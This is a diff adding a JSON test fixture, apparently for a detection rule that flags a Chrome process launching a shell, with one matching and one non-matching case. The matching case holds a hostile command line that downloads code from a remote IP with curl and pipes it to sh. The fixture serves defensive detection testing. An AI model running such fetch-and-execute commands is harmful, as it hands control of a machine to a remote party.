@@ -1,0 +1,13 @@
+{
+  "matching": {
+    "parentimage": "/opt/google/chrome/chrome",
+    "image": "/bin/sh",
+    "cmdline": "sh -c curl -s http://203.0.113.7/x | sh"
+  },
+  "non_matching": {
+    "parentimage": "/usr/bin/google-chrome",
+    "image": "/opt/google/chrome/chrome",
+    "cmdline": "/opt/google/chrome/chrome",
+    "note": "the launcher script starting the browser: the browser is the child, not the parent"
+  }
+}
